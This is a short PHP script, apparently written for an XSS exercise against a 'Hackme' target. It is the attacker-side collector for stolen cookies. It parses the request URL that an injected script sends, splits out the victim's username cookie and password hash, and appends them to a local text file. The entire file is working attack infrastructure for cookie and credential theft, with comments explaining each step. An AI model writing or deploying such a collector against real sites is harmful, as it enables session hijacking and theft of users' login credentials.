<?php
$uriSegments = explode("/", parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));//Parse down the URL request from XSS, separate by "/"
$cookie = explode(";%20",$uriSegments[4]);//Further parse down where all cookies is
$myfile = fopen("cookiesAllocated.txt", "a") or die("Unable to open file!");//Prepare a txt file at the same directory
fwrite($myfile, $cookie[0]);//Hackme username cookie
fwrite($myfile, "\n");
fwrite($myfile, $cookie[1]);//Corresponding password hash 
fclose($myfile);
?>

//URL parse method reference: https://www.codexworld.com/how-to/get-uri-segment-php/